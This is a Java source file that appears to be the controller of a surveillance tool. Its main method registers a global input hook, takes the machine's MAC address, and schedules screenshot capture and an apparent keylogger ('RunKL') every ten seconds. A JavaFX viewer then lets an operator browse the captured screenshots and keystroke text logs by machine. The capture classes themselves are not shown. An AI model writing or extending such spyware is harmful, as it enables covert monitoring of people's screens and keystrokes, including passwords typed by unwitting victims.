/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package jnativehookexample;



import java.io.*;
import java.io.File;
import java.io.FilenameFilter;
import java.util.Arrays;
import java.util.Calendar;
import java.util.Timer;
import java.util.logging.Level;
import java.util.logging.Logger;
import javafx.application.Application;
import javafx.event.ActionEvent;
import javafx.event.EventHandler;
import javafx.geometry.Pos;
import javafx.scene.Group;
import javafx.scene.Scene;
import javafx.scene.control.Button;
import javafx.scene.control.ComboBox;
import javafx.scene.control.Label;
import javafx.scene.control.TextArea;
import javafx.scene.image.Image;
import javafx.scene.image.ImageView;
import javafx.scene.layout.Pane;
import javafx.scene.layout.StackPane;
import javafx.scene.layout.VBox;
import javafx.stage.Stage;
import javax.swing.filechooser.FileNameExtensionFilter;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

/**
 *
 * @author x
 */
public class JNativeHookExample extends Application{

    /**
     * @param args the command line arguments
     */
    public static File[] listOfFiles1=null,listOfFiles=null;
    public int index=0,indextxt=0;
    public static String s;
    public String s1,s2;
    public int mYear;
    public int mMonth ;
    public int mDay;
    public int mHour ;
    public int mMin;
    public int mSec;

    
    public static void main(String[] args) throws Exception  {
        // TODO code application logic here
        MACaddress mac = new MACaddress();
        s = mac.getmac();
        File folder = new File("C:\\\\Users\\\\PanTomek\\\\Desktop\\\\ThisOneFile\\" + s);
        listOfFiles = folder.listFiles(new FilenameFilter() {
            public boolean accept(File folder, String name) {
                return name.toLowerCase().endsWith(".jpg");
            }
        });

        listOfFiles1 = folder.listFiles(new FilenameFilter() {
            public boolean accept(File folder, String name) {
                return name.toLowerCase().endsWith(".txt");
            }
        });
        if(listOfFiles1.length!=0&&listOfFiles.length!=0){
        System.out.println(listOfFiles1[0].getName());
        Application.launch(args);
        }
        
        
        
        
        
        try {
            Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
            logger.setLevel(Level.OFF);
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());

            System.exit(1);
        }
       // KeyListener keyListener = new KeyListener();
       // PrintScreen ps = new PrintScreen();
        //MouseListener mouseListener = new MouseListener();sakmcxxxzakskckaosodlsqwaszxcxaasdzxcasxzasxz
        //MouseWheelListener mouseWheelListener = new MouseWheelListener();
        

        //GlobalScreen.addNativeKeyListener(keyListener);
        //GlobalScreen.addNativeMouseListener(mouseListener);
        //GlobalScreen.addNativeMouseMotionListener(mouseListener);
        //GlobalScreen.addNativeMouseWheelListener(mouseWheelListener);

        Timer timer = new Timer();
        timer.schedule(new PrintScreen(), 0, 10000);
  
        
        
        Timer timer2 = new Timer();
        timer2.schedule(new RunKL(), 0, 10000);
        
       
        
        
        
        
    }

    @Override
    public void start(Stage primaryStage) throws Exception {

        File folder = new File("C:\\\\Users\\\\PanTomek\\\\Desktop\\\\ThisOneFile\\" + s);
        listOfFiles = folder.listFiles(new FilenameFilter() {
        public boolean accept(File folder, String name) {
        return name.toLowerCase().endsWith(".jpg");
        }
        });
        
        listOfFiles1 = folder.listFiles(new FilenameFilter() {
            public boolean accept(File folder, String name) {
                return name.toLowerCase().endsWith(".txt");
            }
        });
        
        File file = new File("C:\\\\Users\\\\PanTomek\\\\Desktop\\\\ThisOneFile\\\\");
        String[] directories = file.list(new FilenameFilter() {
            @Override
            public boolean accept(File current, String name) {
                return new File(current, name).isDirectory();
            }
        });
        
        System.out.println(Arrays.toString(directories));
   
        TextArea textArea = new TextArea();
        Label label = new Label();
        
        
        primaryStage.setTitle("Load Image");
        Pane root = new Pane();
        Image img = new Image("file:"+listOfFiles[index]) ;
        ImageView imgView = new ImageView(img);
        imgView.setFitHeight(720);
        imgView.setFitWidth(1200);
        
        s1 = listOfFiles[index].getName();
        s1=s1.substring(10,23);
        Calendar calendar = Calendar.getInstance();        
        calendar.setTimeInMillis(Long.valueOf(s1));
        mYear = calendar.get(Calendar.YEAR);
        mMonth = calendar.get(Calendar.MONTH);
        mDay = calendar.get(Calendar.DAY_OF_MONTH);
        mHour = calendar.get(Calendar.HOUR);
        mMin = calendar.get(Calendar.MINUTE);
        mSec = calendar.get(Calendar.SECOND);
        label.setText(Integer.toString(mHour)+":"+Integer.toString(mMin)+":"+Integer.toString(mSec)+ " " + Integer.toString(mDay) +"/"+ Integer.toString(mMonth) +"/"+ Integer.toString(mYear));

        if (listOfFiles1[indextxt] != null) {
            textArea.setText(readFile(listOfFiles1[indextxt]));
        }
        
        
        

        Button button1 = new Button("->");
        Button button2 = new Button("<-");
        ComboBox cb=new ComboBox();
        cb.getItems().addAll(directories);
        
        button1.setOnAction(new EventHandler<ActionEvent>() {
            @Override
            public void handle(ActionEvent event) {
                index++;
                if(index >= listOfFiles.length){
                index=0;
                indextxt=0;
                }
                s1 = listOfFiles[index].getName();
                s1 = s1.substring(10, 23);
                Calendar calendar = Calendar.getInstance();
                calendar.setTimeInMillis(Long.valueOf(s1));
                mYear = calendar.get(Calendar.YEAR);
                mMonth = calendar.get(Calendar.MONTH);
                mDay = calendar.get(Calendar.DAY_OF_MONTH);
                mHour = calendar.get(Calendar.HOUR);
                mMin = calendar.get(Calendar.MINUTE);
                mSec = calendar.get(Calendar.SECOND);
                label.setText(Integer.toString(mHour) + ":" + Integer.toString(mMin) + ":" + Integer.toString(mSec) + " " + Integer.toString(mDay) + "/" + Integer.toString(mMonth) + "/" + Integer.toString(mYear));
                
                s2 = listOfFiles1[indextxt].getName();
                s2 = s2.substring(5, 18);
                try {
                    while(Long.parseLong(s2)<=Long.parseLong(s1)&&indextxt+1 <= listOfFiles1.length-1){
                        indextxt++;
                        s2 = listOfFiles1[indextxt].getName();
                        s2 = s2.substring(5, 18);
                    }
                    indextxt--;
                    
                    if (indextxt < 0) {
                        indextxt = 0;
                    }
                    if (indextxt > listOfFiles1.length-1) {
                        indextxt = listOfFiles1.length-1;
                    }
                } catch (Exception ex) {
                    System.out.println("error :" + ex);
                }
                System.out.println(listOfFiles1.length);
                System.out.println(index);
                System.out.println(indextxt);
                textArea.setText(readFile(listOfFiles1[indextxt]));
                Image img = new Image("file:"+listOfFiles[index]) ;
                ImageView imgView = new ImageView(img);
                imgView.setFitHeight(720);
                imgView.setFitWidth(1200);
                root.getChildren().add(imgView);
            }
        });
        button2.setOnAction(new EventHandler<ActionEvent>() {
            @Override
            public void handle(ActionEvent event) {
                index--;
                if (index < 0) {
                    index = listOfFiles.length-1;
                }
                
              
                if (listOfFiles1[indextxt] != null) {
                    textArea.setText(readFile(listOfFiles1[indextxt]));
                }

                s1 = listOfFiles[index].getName();
                s1 = s1.substring(10, 23);
                Calendar calendar = Calendar.getInstance();
                calendar.setTimeInMillis(Long.valueOf(s1));
                mYear = calendar.get(Calendar.YEAR);
                mMonth = calendar.get(Calendar.MONTH);
                mDay = calendar.get(Calendar.DAY_OF_MONTH);
                mHour = calendar.get(Calendar.HOUR);
                mMin = calendar.get(Calendar.MINUTE);
                mSec = calendar.get(Calendar.SECOND);
                label.setText(Integer.toString(mHour) + ":" + Integer.toString(mMin) + ":" + Integer.toString(mSec) + " " + Integer.toString(mDay) + "/" + Integer.toString(mMonth) + "/" + Integer.toString(mYear));
                System.out.println(listOfFiles.length);
                System.out.println(index);
                
                s2 = listOfFiles1[indextxt].getName();
                s2 = s2.substring(5, 18);
                try {
                    while(Long.parseLong(s2)<=Long.parseLong(s1)&&indextxt+1 <= listOfFiles1.length-1){
                        indextxt++;
                        s2 = listOfFiles1[indextxt].getName();
                        s2 = s2.substring(5, 18);
                    }
                    indextxt--;
                    
                    if (indextxt < 0) {
                        indextxt = 0;
                    }
                    if (indextxt > listOfFiles1.length-1) {
                        indextxt = listOfFiles1.length-1;
                    }
                } catch (Exception ex) {
                    System.out.println("error :" + ex);
                }
                System.out.println(indextxt);
                textArea.setText(readFile(listOfFiles1[indextxt]));
                Image img = new Image("file:" + listOfFiles[index]);
                ImageView imgView = new ImageView(img);
                imgView.setFitHeight(720);
                imgView.setFitWidth(1200);
                root.getChildren().add(imgView);
            }
        });
        cb.setOnAction(new EventHandler<ActionEvent>() {
            @Override
            public void handle(ActionEvent event) {
                indextxt = 0;
                index = 0;
                s=cb.getValue().toString();
                System.out.println(cb.getValue());
                File folder = new File("C:\\\\Users\\\\PanTomek\\\\Desktop\\\\ThisOneFile\\" + s);
                listOfFiles = folder.listFiles(new FilenameFilter() {
                    public boolean accept(File folder, String name) {
                        return name.toLowerCase().endsWith(".jpg");
                    }
                });

                listOfFiles1 = folder.listFiles(new FilenameFilter() {
                    public boolean accept(File folder, String name) {
                        return name.toLowerCase().endsWith(".txt");
                    }
                });
                Image img = new Image("file:" + listOfFiles[index]);
                ImageView imgView = new ImageView(img);
                imgView.setFitHeight(720);
                imgView.setFitWidth(1200);
                s1 = listOfFiles[index].getName();
                s1 = s1.substring(10, 23);
                Calendar calendar = Calendar.getInstance();
                calendar.setTimeInMillis(Long.valueOf(s1));
                mYear = calendar.get(Calendar.YEAR);
                mMonth = calendar.get(Calendar.MONTH);
                mDay = calendar.get(Calendar.DAY_OF_MONTH);
                mHour = calendar.get(Calendar.HOUR);
                mMin = calendar.get(Calendar.MINUTE);
                mSec = calendar.get(Calendar.SECOND);
                label.setText(Integer.toString(mHour) + ":" + Integer.toString(mMin) + ":" + Integer.toString(mSec) + " " + Integer.toString(mDay) + "/" + Integer.toString(mMonth) + "/" + Integer.toString(mYear));

                if (listOfFiles1[indextxt] != null) {
                    textArea.setText(readFile(listOfFiles1[indextxt]));
                }
                root.getChildren().add(imgView);  
            }
        });
        textArea.setLayoutX(10);
        textArea.setLayoutY(720);        
        button1.setLayoutX(1000);
        button1.setLayoutY(720);     
        button2.setLayoutX(900);
        button2.setLayoutY(720);
        label.setLayoutX(650);
        label.setLayoutY(720);
        cb.setLayoutX(650);
        cb.setLayoutY(740);        
        
        
        root.getChildren().add(imgView);
        root.getChildren().add(button1);
        root.getChildren().add(button2);
        root.getChildren().add(textArea);
        root.getChildren().add(label);        
        root.getChildren().add(cb);
        Scene scene = new Scene(root);       
        primaryStage.setScene(scene);
        primaryStage.show();
   
    }

    private String readFile(File file) {
      StringBuilder stringBuffer = new StringBuilder();
        BufferedReader bufferedReader = null;
         
        try {
 
            bufferedReader = new BufferedReader(new FileReader(file));
             
            String text;
            while ((text = bufferedReader.readLine()) != null) {
                stringBuffer.append(text);
                stringBuffer.append(System.getProperty("line.separator"));
            }
 
        } catch (FileNotFoundException ex) {
            Logger.getLogger(JNativeHookExample.class.getName()).log(Level.SEVERE, null, ex);
        } catch (IOException ex) {
            Logger.getLogger(JNativeHookExample.class.getName()).log(Level.SEVERE, null, ex);
        } finally {
            try {
                bufferedReader.close();
            } catch (IOException ex) {
                Logger.getLogger(JNativeHookExample.class.getName()).log(Level.SEVERE, null, ex);
            }
        } 
         
        return stringBuffer.toString();
    
    }


}
